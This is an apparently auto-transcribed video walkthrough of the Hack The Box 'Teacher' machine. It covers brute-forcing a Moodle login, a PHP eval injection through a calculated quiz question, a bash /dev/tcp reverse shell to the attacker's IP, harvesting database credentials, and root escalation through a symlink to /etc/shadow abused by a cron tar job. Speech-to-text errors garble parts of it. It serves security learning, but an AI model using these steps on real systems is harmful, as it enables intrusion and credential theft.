 what's going on YouTube this is a hip sack and I'm gonna be doing teacher from hack the box and I haven't really got much time to record this week so we'll see how this video goes I had some car troubles which killed like two four nights of mine and the last time I did this box was probably two to three months ago around the time it got released from what I remember there is a website you do something to get information on how to log into an application called Moodle which is an open source school type thing where you can have teachers that create lessons plans and students that do the lesson plans and quizzes and create it on it and then the previous quiz something along with the lines of a cron job so let's just jump in and get to it as always we begin with an nmap with - SC for depo scripts as V enumerate versions Oh a output or format spinning and map directing call it teacher and then the IP address which is 10 10 10 153 this can take some time to run so I've already ran it looking at the results we have just one port open it is HTTP on port 80 and it says it's Apache HTTP D and it's a debian computer we also have the title of the web page as a black hat high school but let's go and check it out and see what is there so go to 10 10 10 153 and we see just a what looks like a normal web page before I spend too much time poking in I do want to set up a go Buster in the background because we always want to be doing some type of recon while we do some type of testing so do go Buster - you for your L paste the URL - wo word list user share world lister buster directory list - 3 medium text - over out file and we'll just call this go Buster - root dot log and we'll set the threads to 50 I think the default is 10 and then go poke around the website we see we already found images CSS manual J s and JavaScript but let's see what is here so the first thing I do is look around at the links and see if the extensions give away what type webserver it is we just see the extensions as HTML so we don't know if it's actually processing code or not so let's go take a look at the source and I press control you to view the source and here I'm looking at if I recognize any of the code that may be part of some type of CMS or static website builder or something along those lines I do see and enter you right here and that says try to load images slash five PNG and on arrow do a consult log that's an F so I'm gonna go back to the web page I'm gonna press f12 and then looking at the console I see a did print that is an F I go to students events events isn't a saying teachers so it looks like every time I go there it is airing out something and if we look at this image we see just it Firefox can't display it so if we grab this and go to download it so if I go to my terminal and I do a curl on that and then - go for out file five dot PNG and then we try to open it well look at what it is so I'll just do like xxd on five dot PNG which is a just hex editor and I see it is not an image at all it is just a picture so if we look at the contents of it we see high service desk I forgot the last character of my password the only part I remember is the cool teach I guess could you guys figure out what the last character is or just reset it thanks Giovanni so if you didn't want to find the image this way you can also just go to like let's say slash images and look at all them and notice five dot PNG doesn't follow the same naming scheme and there's also a lot smaller there's no really good sheriff our way to find things like this unfortunately it's kind of one of those silly CTF problems but if you did normal enumeration it sticks out like a sore thumb as you saw so the next thing we have to do is find a way to log into the web app so let's go back to or go by and see if we have anything so we found PHP myadmin and Moodle so let's go check out what PHP myadmin is it says a 403 so if we go there we get for bin and we don't get any type of login page so I'm just going to ignore this it's probably gonna be related to the server if we really wanted to we could send this over to Berk and then try some things to try to fool the server into we're coming from like localhost which is probably allowed so we can afford this and then we can say host let's send it to repeater first we can put white host localhost click go and we still see 404 we can add the like x-forwarded-for header and put this local host see this as tool that every now and then you see this as like a proxy setting and some time apps take it and set the variable you can Google like exported for bypasses and kind of get an idea exactly what that host header is but I don't see any way to get into PHP myadmin so I'm going to move on to the next one which is Moodle so let's go back to Firefox we can turn off for now and then go to slash Moodle and we get a dynamically created page I'm going to hover over the algebra link and I see view dot PHP so we know it's a PHP web server click this menu thing to see if there's anything it doesn't look like it and then we also see you and not logged in so let's try logging in with the credentials we had but before we do that if we look at the actual message it says he forgot the last character it's password but it doesn't really give a username so we have to figure out exactly what the username may be so I'm gonna click forgotten username and password and see if this tells us if the account is valid or not searching for if SEC it just says the password should have been emailed to you so we don't know if that's a valid username let's go back to the home page I can click on the tea and it wants us to login I'm gonna try to log in as a guest to see if it gives us any more information and guests can't access any user profiles looking at the calendar maybe we can do something from here it doesn't look like it we can go back a few months because well this box was created a few months ago and see if anything was ever in this calendar it does not look like it so don't know a good way to enumerate valid users or what the name may be but we can probably guess it's Giovanni whether it's a capital or not I don't know and I don't see like a registration thing where we could register an account and see if it counts are case-sensitive so I'm just gonna guess that it is case-sensitive and probably it's a capital G since that's what it is display name shows so I'm gonna switch to use burp suite I'm gonna login with Giovanni and the password was there's a cool teacher with a special character at the end I don't know if this is a just period at the end of the sentence or it's actually part of the password I'm gonna guess it's appeared at the end of the sentence because he's putting punctuation at the end of everything else so if it doesn't succeed we will try again adding period and then a special character so let us go back to Firefox paste it without that period and click login going to burp suite go to the proxy tab and we can send this one over to repeater and we noticed there is no cross-site request forgery tokens also known as CSRF which would stop us from just throwing this straight into w fuzz so i'm gonna copy the URL portion we're going to go back and do w fuzz - H to get a list of all the arguments we'll do W fuzz - zero for URL HTTP 10 10 10 153 paste the URL and then we want to do - D for post data and grab the actual post request which is this put it in single quotes and then after the password put fuzz and all caps because W fuzz is gonna do a search or place for a fuzz with all caps with each line and this word list that we give it and we'll give it user share SEC list and then fuzzing and we have a bunch of lists here I'm going to do the special cares text because passwords normally end with the special character and that should be it so let's go and then we're going to look at the number of characters in each request and we can see right now sending it a pound gives it a different number which is 454 if we didn't know that we could do dash dash H capital a dash dash H H to hide characters and then for 40 and run through this again so we see the password probably is the cool teacher with a hashtag at the end so let's go back into Firefox we can disable burp for now and put a pound sign at the end of the password and let's see I probably want to do default for all URLs which will disable the proxy is it gonna wall again it's on default let's go to 10 10 10 153 slash Moodle let's do login Giovani paste the password and we get logged in I'm not sure exactly what was going on before but now we are logged in as Giovanni so poking around at the site to see if there's anything there the first thing I look at is private files I'm going to do like a LG and look around here don't really see too much but I am gonna do a search point for a Moodle and we see a a bunch of various exploits so the first thing to do is try to identify what version of Moodle is running so to do that I'm just going to go to github Moodle and see if there's anything here that may help me so looking down the list looking at files we do have a version dot PHP so I'm gonna try going to that page first and we see just a blank page so it doesn't look like that actually loads and I may check a few other files may do like md5 sums on Java scripts and this and get it that way but I'm just gonna see if anyone's published anything on how to do it so I'm going to Google Moodle enumerate versions and we see the first result is Doc's Moodle comm and scrolling down finding the version of Moodle if you are not an admin and it looks like just look at the document number so middle docs for this page so if we scroll down we see Moodle Doc's for this page we'd go to the URL it brings us to Moodle 3.4 and we can see there's Doc's aren't listed here it's 36 + 5 + 3 1 which is indication maybe that will have a vulnerability but if we also Google like Moodle release 3.4 we'll see the release notes and it was released 13 November 2017 so going back to a terminal window I don't see anything for Moodle like 3 4 there is this Metasploit module but it's not telling us what version it is for and I'm just going to Google like Moodle exploit 3.4 3.5 and I included 3.5 in that because that document is also missing so googling that brings us a few pages we do have a exploit DB thing for Moodle 3 for 1 and we also have a blogs from rip stack come and I'm going to choose this before the Metasploit module because it's probably gonna explain exactly how this works and we can see in the question type calculated question type dot PHP there is a eval string to formula and I'm guessing somewhere here we can actually control what formula is and pass data straight to eval so that's what it looks like this exploit is if we go back and look at the Metasploit module what was it formula I forgot exactly what the page was do we see what's making a get request to so we're doing payload it's doing a Python payload and it's setting it to question question dot PHP which looks like yes that is what we saw on the rip stack blog so let's try to exploit this manually so going back over into the Moodle webpage we know we have to create a quiz or something what did rip stat call it let's go back here yeah we have to create a quiz so let's go back and poke around Moodle to see if we can create a quiz going to the dashboard we don't really have anything here go to courses algebra topic one it just goes down there's nothing in these topics if I look at this little gear I can click this and I'm looking at where like add quiz would be we see turn editing on so let's do that and then now we have add an activity or resource so clicking that going to quiz let's add this and the name let's do please subscribe the description we can put and leave a comment and then we got to kind of look at where we may see them do a eval command and that was in the formula so going through all these I'm just looking for something that would be related to formula haven't really seen it yet great boundary if we could edit that maybe because we see percent go to common module nothing restrict access completion no tags combat cease don't really see anything so we will save and display and then let's go edit the quiz to add questions let's see add a new question and we have to find something that may have a formula so I'm gonna choose calculated because calculations generally have formulas and we'll see where it goes so question name did you subscribe question text of course I'm talking about epic on YouTube and let's see default mark feedback answers here we go we got the formula here so if we go back to this post and scroll down we have the formula so what they did was do 1.2 and if PHP evaluates 1.2 it'll do something I actually don't know what this does so let's see if we can verify that real quick so I think that's PHP - I to add an interactive mode and then we can just copy this and then I think it's echo in PHP and it says 1.2 if we do 1 plus 2 we see 3 so that's probably what I would have done to see if eval worked because it's wrapped around eval so it's just executing everything but that being said let's just try to copy what it says success and run it so let's go back into calculate a quiz put this for the formula and there's get 0 it's just a parameter I like doing requests and we can also change zero to please subscribe because that really shouldn't matter that's just gonna be the variable we pass in to get executed because keep in mind this whole answer thing is wrapped in eval so we don't have to put the evil in there we just have to put what code should get executed and all this stuff is to bypass a filter but it still should execute this so feedback yes maybe I wish I could do like yes no but yes should be the only answer to did you subscribe so let's try Save Changes and see what happens did you subscribe yes test illegal format starting with the semicolon so let's wait what I think that should be it so it said studying with semicolon we have an error my confusions mainly just coming from this blog post saying it's getting around some type of regular expression to make sure this is a valid formula so I would have sumed this is needed but let's just get rid of everything and close it off maybe if it airs out we can do slash slash 1.2 because I think slash slash is a PHP comment so maybe it just doesn't need the semicolons but we can try this and see if it works so Save Changes and do we have an error message one answer should have a score of a hundred percent so it's possibly get full marks for the question tolerance grade 100 percent Save Changes so it looks like that has worked the wild codes X will be substituted by a numerical data sure okay so now we had two Oh syntax error expected and a file shoot that went back well information sorry we can't be more helpful that is awesome so let's go back and see if we can wait a second I guess this is old stuff from either a testing machine or creating it so if you go in the question Bank apparently I just noticed this there are old questions that I guess just didn't get cleaned up because we can see June 2018 and we see my question in April 2009 teen so we can cheat and look at what they did see if this has the answer so it is slash slash and then X so let's go back to mine and see this box just became easier that it eliminated a lot of troubleshooting so instead of doing slash slash X let's just try slash 1.2 so we don't have any spaces so I'm not going to introduce that bad character Save Changes next page syntax error so let's try adding that X we're just going to try to figure out where that error message is coming from so go back we can probably refresh this page my Firefox is hung right now okay so now let's back down and we can try it with the hex don't know why that ex would do anything so let's save changes click next page and still a syntax error so let's go back to the question Bank open this in a new tab edit did you subscribe and they have oh a semicolon so I guess that previous error message was because we ended with the semicolon which kind of makes sense if you're thinking about like a regular expression looking for a valid thing so let's leave this 1.2 back on and put the semicolon before that because there's probably no reason for a formula and with semicolon so maybe that's why it had said bad syntax so go next page and still an error message so let's go back a few times and we're just gonna copy what we have so let's copy this go to a terminal let's do a new pane v10 and compare the two cuz this one should probably work so what do we have we could change this back to a get but I want to leave it like this okay so we added a semicolon and left it at one point do like this and got a syntax error so one thing I'm going to do and let's see this will be right here so 1 2 3 4 5 6 2 f and then o 60 so what I was doing here is making sure the tactics are the same and not some weird version of Unicode so let us change this one to be just semi colon backslash slash slash X we had one point two before and let's see if this one works because that semicolon looks like it's the only difference and there we go we don't have an error message anymore and if we send this request over to burp let's make sure intercept is on and not intercepting anything okay refresh send to repeater and let's try adding and please subscribe is equal to will do paying plus because it's URL encoding 10 10 14 3 and before that we want probably - and +1 to only pain one time so we don't start a lot of pings we do TCP dump - ie 0 ICMP and I normally like doing - N and it's not Ethio it is tun 0 for VPN adapter but I like doing - and to not do dns resolution and then click go and we don't see a ping so let's see if we do slash bin slash ping we get a delay if config tun 0 and our IP is correct at 10 10 14 3 maybe this isn't how we trigger it oh there we go it was that - n maybe - Shanna's windows and I wanted - see but let's see ping - H and let's see - t is count - I must be Windows and that's why I always like having some type of argument because now we have the server constantly pinging us and sometimes you can actually hang the server if it's not a threaded web server because this child process will just stay alive so let's see if we can do P kill for process kill + ping click go and we can't did we hang the server please say we did not go and I think we did I'm going to pause the video and we'll give this like 2 or 3 minutes to see if the server comes back to us but I don't think the PHP piece is threaded so we may have just hung this go back to Moodle yeah we can't load anything so should've tried - see before a game where - n but owners give this some time to see if it times out if not then I'll just resume the video here and pretend we did - see instead of - n so I rebooted the box we can see it works so we can also see we're no longer getting pings let's do this the correct way and then get a shell so let's go was this what we had ping what is this where we had ping I'm not sure exactly where we had typed ping let's do and please subscribe is equal to paying + - c plus 1 for count 10 10 14 300 why did - and before but let's just click go and we have one ping well maybe that was two pings request reply request reply but either way it's not a constant loop of pinging so the server comes back to us and it's not hung so let's do a reverse shell and then we will begin with the probe esque so let's do was it bash - I that dev TCP ten ten fourteen three slash will do 9001 and then it is I want to say two and one like that let's go Google pen test monkey and make sure this is the correct shell so pen test monkey reverse shell cheat sheet and make sure all those numbers are correct 0 and 1 so 0 and 1 that looks good so let's copy ctrl you to your LM coda go back to a terminal neck cat LVN P 9001 click go don't get a shell so I'm gonna do bash space - C space single quote and end this in a single quote click go and we get a shell so Python - C and what PT y PT y spawn Ben - then we can background it with ctrl Z and do stty raw - echo and then hit FG enter and now we got a decent shell to moodle so the first thing I normally do whenever I pop a web server is to look at where the database configures and poke around the database so let's just LS grab for config and we see config dot PHP so let's cat that and we can see the database is MySQL database names Moodle and users root and password is welcome one so do MySQL - you root - D for database Moodle and - P maybe it's - capital D for database and the password wel k om one exclamation point let's copy and paste because I probably type out that maybe we go where in Moodle so we're gonna do show tables and see all the tables I'm going to search this for like user use a private key let's see use the last access maybe MDL user or password history would be good but let's just try user first and we can do describe MDL use it to show what rows are in this and we probably want something with name so user name and password so let's do select ID username password from its MDL underscore users I believe was it user users user enter and we get a few hashes so we have a bunch of bcrypt hashes and then this one hash that looks like it's md5 so let's do echo - n WC - c - count it 32 that is gonna be an md5 sum we could go to hash cat to crack this but most md5 is you can just Google and get it and that hash is it said hashes for expelled so Giovanni backup is expelled so if we exit my sequel and do a cat Etsy passwd we do have a giovanna user so we can do su - Giovanni try expelled and we get access to his user so we can do WCC used our text we can read that 30 30 characters that is md5 sum in a line break and then there is this directory called work so let's go take a look at what work is we got courses temp so I'm just gonna do a fine - OS to get an idea what this is and it just has a list of the courses so we kind of have to figure out exactly what's going on here let's do a LS on Etsy cron dot star to see if there's anything out of the ordinary we have a cron for PHP week at Etsy cron D on PHP there's nothing there just a session cleanup thing and the reason why I'm focusing at this is because this is today's date so we know something's going on here probably some type of cron because it looks like it's going every minute since if I look at the date it is saying it is zero zero twenty nine and up there was zero zero 27 so we do LS la on temp find dot - LS we still see things are on April 29th at 20th I'm gonna check out what Etsy crontab is to see if anything is there we don't have any Cron's so most likely the cron is somewhere in verse pool krong krong tabs and then I'd guess root since we have root creating these directories but we can't read route so we have to use like a program to identify processes that is running so let's go and grab go spy so let's do locate go spy and I thought I had on my box maybe I don't I swear I've used this before let's try ghost by again I do not have it so let's go github go spy and download this this is just a good process man right at least I believe it's ghost by let's look at what the readme says goes by mana calls to a function that's not it go PS PI I forget what the program's called now go program monitor process Linux maybe it's just PS bye so let's try PS spy go PS by github o [Music] locate PS spy locate piece by that may nope that's not it I think was actually I used in curling so maybe I haven't in curling's directory dub-dub-dub PS PI I think that's it PS PI github there we go this is it so many tools memory the names can be tough let's just do a CD opt get clone oh do I have it I do have it CD PS by and then find grep PS by let's do go oh s equals Linux go work equals probably 64-bit it is AMD 64 and then go build go get and get each of these I want to go back and curling to see exactly how I grab this maybe there's a release and I just downloaded it and my Cali be I'm song again something's going on with my Cali BM today that's the second time or maybe third time it's hung so it looks at my go get crashed but I closed Firefox so let's try this again and there we go now go get worked so Firefox was eating all my memory it looks so let's try this go OS command again and it has built so when now we have piece by here we can move piece by to htb boxes teacher and then go into that directory and then make dub dub dub and then move piece by to dub dub dub going over to netcat we still have a shell so let's do a CD slash dev sh m and then curl ten ten fourteen three slash we need put eight thousand slash piece by - OH piece by and then start that web server so python dash m simple HTTP server and then run this curls not found let's do double you get ten ten fourteen three port 8000 piece by it is now downloaded we can do chmod plus x piece by chmod plus x piece by and I was looking for the color to show its executable it's good we can execute this and now it is watching processes so we should see a new one pop up as the Cron's run and there we go we have cron running and then we have been SH see user bin back up dot s H so let's take a look at what that file is LS la on it we can read it so let's look at it and let's just do a cat there we go so now I can clear the screen and I can cat it so what we're doing is going into CD home Giovani work and then it is running the command turret - czv f10 backup courses are gz2 courses and then going into temp and then xf would be extract the file and chmod everything to 777 so what we can do is if we remove t'aime or I'm - or f1 town we can probably do a symlink so Etsy shadow into home giovani work Tim so now when it does this to our command it's going to tar a symlink which points it to Etsy shadow and then it's going to chmod 777 Etsy shadow so if we do LS la we do see Etsy shadow now has permissions of 777 so we can edit this and change the root password to be what Giovanni's is so let's cat Etsy shadow grep Giovanni and we will copy this over top of the root password probably should of backed up the shadow before doing this but oh well so let's base this in and now we should be able su and then Giovanni's password I think was expelled and now we are route so that is the box hope you guys enjoyed it take care and I will see you all next week